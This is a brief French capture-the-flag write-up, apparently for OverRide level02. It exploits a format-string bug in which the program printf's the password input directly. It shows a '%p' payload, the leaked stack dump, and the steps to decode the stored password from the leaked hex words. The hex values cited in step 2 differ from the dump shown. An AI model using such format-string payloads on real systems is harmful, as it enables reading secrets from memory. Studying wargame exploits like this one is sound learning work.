- Apres analyse du code asm, on remarque que le en cas d'un' mdp
invalide, un printf est directement utiliser avec le buffer
de reception des input utilisateur.
- On va pourvoir imprimer le stack et du coup voir la string du mdp
utilisee pour le strncmp

1) On cherche l'emplacement des arguments du printf

nano /tmp/test2
python -c 'print "%p." * 40'
python -c 'print "toto"'

chmod 777 /tmp/test2
level02@OverRide:~$ ./level02 < <(/tmp/test2)
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4e0.(nil).0x25.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6d8.0x1f7ff9a08.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x100000000.(nil).0x38614e674c427750.0x3735574b544d3870.0x43514156787a3753.0x714a385670436e78.0x7642455839735454.(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70. does not have access!

2) On remarque entre 2 null qu'il y a une string :

(nil).0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.(nil)

3) On modifier l'endian de chaque partie de chaque paquet de 8 et on passe en ascii
